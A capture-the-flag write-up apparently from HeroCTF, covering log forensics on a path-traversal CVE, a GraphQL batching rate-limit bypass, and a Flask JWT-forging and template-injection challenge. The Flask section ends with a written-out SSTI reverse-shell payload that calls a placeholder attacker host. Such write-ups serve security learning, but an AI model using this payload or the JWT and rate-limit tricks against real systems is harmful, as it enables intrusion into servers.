## Forensics
### dev.corp 1/4
>The famous company dev.corp was hack last week..
>They don't understand because they have followed the security standards 
>to avoid this kind of situation.
>You are mandated to help them understand the attack.
>For this first step, you're given the logs of the webserver of the 
>company.

>Could you find: 
>- The CVE used by the attacker ?
>- What is the absolute path of the most sensitive file recovered by the 
>attacker ?


For this challenge we are given a access.log file. This are the logs of 
a webserver. Our goal is to find 
which CVE the attacker used and whats the most sesitive file he 
recovered.
I tried to find some useful information in the file, like the /etc/
passwd file. We can see, that a path traverlsal has been exploitet.

A Quick research of "dublicator_download", I found the corresponding 
CVE: `CVE-2020-11738`
After some more research on the access.log file, I found that the 
attacker wanted the id_rsa_backup file.
So we get the Flag:

FLAG: `Hero{CVE-2020-11738:/home/webuser/.ssh/id_rsa_backup}`

## Web
### Best Schools
>An anonymous company has decided to publish a ranking of the best 
>schools,and it is based on the number of clicks on a button! Make sure 
>you get the 'Flag CyberSecurity School' in first place and you'll get 
>your reward!


We are give with a website were we can vote for different kinds of 
schools. Because of the description we know that we need to get the 
'Flag CyberSecurity School' in th first place to get 
the Flag. But if we try to increase the votes we can only send one 
request per minute. So it would take a while to get the flag like this.

![school 1](/assets/img/HeroCTF/best_school_1.png)
![school 2](/assets/img/HeroCTF/best_school_2.png)

The request in brup shows that the application is based on graphql. We 
can send multiple requests in graphql, so we need to modify the HTTP 
request:

![school 3](/assets/img/HeroCTF/best_school_3.png)
                                        
No we just need to send enough votes to get the Cyber Flag School in 
first place and we get the flag.


FLAG: `Hero{gr4phql_b4tch1ng_t0_byp4ss_r4t3_l1m1t_!!}`

The landing page is showing an Invalid operatin error.

![flask 1](/assets/img/HeroCTF/flask_1.png)


Executing the example from the landing page ends up with the result: 3. 
I wantet to know if there is maybe a login page, but if we try to access 
the /login page, there is anohter error.

![flask 3](/assets/img/HeroCTF/flask_3.png)


A look at the /adminPage is showing a message that we can't access this 
page, beacause we are a 'guest'.

The Site uses an JWT token. Decode that cookie we see the following:

![flask 4](/assets/img/HeroCTF/flask_4.png)


The role 'guest' is embedded in the token.
It's also using HS256 algorithm, which is symmetric. So we could try to 
bruteforce the key.

![flask 5](/assets/img/HeroCTF/flask_5.png)

The key is week enough and is "key". Now we can change the token to get 
the role admin assigned.

![flask 6](/assets/img/HeroCTF/flask_6.png)

We are now the admin user, but we can't do anything... But it seems that 
the role is reflected on the admin page, so let's try another payload.
Modify the JWT token to the role {% raw %}`{{7*7}}`{% endraw %}
and see if the code is 
executed.
                    
![flask 7](/assets/img/HeroCTF/flask_7.png)                

It works! So let's try to get a reverse shell on the server with the 
following payload embedded in the JWT token: 

{% raw %}
```text
{{cycler.__init__.globals__.os.popen('bash -c \"basb -i >& /dev/tcp/your_ip/999 0>&1\"').read()}}`
````
{% endraw %}

and we should be able to get the falg.
